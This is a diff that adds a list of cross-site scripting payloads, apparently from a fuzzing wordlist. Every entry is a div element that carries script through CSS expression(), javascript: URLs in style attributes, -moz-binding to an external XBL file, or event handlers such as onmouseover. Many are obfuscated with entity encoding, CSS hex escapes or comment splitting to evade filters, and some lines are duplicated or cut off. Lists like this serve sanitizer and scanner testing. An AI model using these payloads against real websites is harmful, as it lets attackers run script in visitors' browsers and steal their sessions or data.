@@ -1,0 +1,48 @@
+<div/style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>
+<divstyle=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>
+<div&nbsp &nbsp style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<div/style="width:expression(confirm(1))">X</div> {IE7}
+<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+<div/onmouseover='alert(1)'> style="x:">
+<div style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
+<div style="font-family:'foo&#10;;color:red;';">LOL
+&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
+&lt;DIV STYLE=\"background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&gt;
+&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
+&lt;DIV STYLE=\"width&#58; expression(alert('XSS'));\"&gt;
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="width: expression(alert('XSS'));">
+<DIV id=XSS STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV id=XSS STYLE="width: expression(alert('XSS'));">
+<DIV id=XSS STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV id=XSS STYLE="width: expression(alert('XSS'));">
+<DIV STYLE="background-image: url(javascript:alert('XSS'));">
+<div onmouseover="alert('XSS');">,
+<DIV id=XSS STYLE="binding: url(javascript:alert('XSS'));">
+<div datafld="b" dataformatas="html" dataid=XSS SRC="#XSS"></div>
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<div style="x:expression(alert(1))">Joker</div>
+<div style="x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))">Joker</div>
+<div style="x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))">Joker</div>
+<div style="x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029">Joker</div>
+<div style="z:exp/*anything*/res/*here*/sion(alert(1))" />
+<div id="alert(/@0x6D6172696F/)" style="x:expression(eval)(id)">
+<div style="color:rgb(''&#0;x:expression(alert(URL=1))"></div>
+<div id=d><x xmlns="><body onload=alert(1)"><script>d.innerHTML=‘’</script
+<div style="x:expression((window.r==1)?'':eval('r=1;
+<div/style="width:expression(confirm(1))">X</div> {IE7}
+<div/onmouseover='alert(1)'> style="x:">
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
+<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
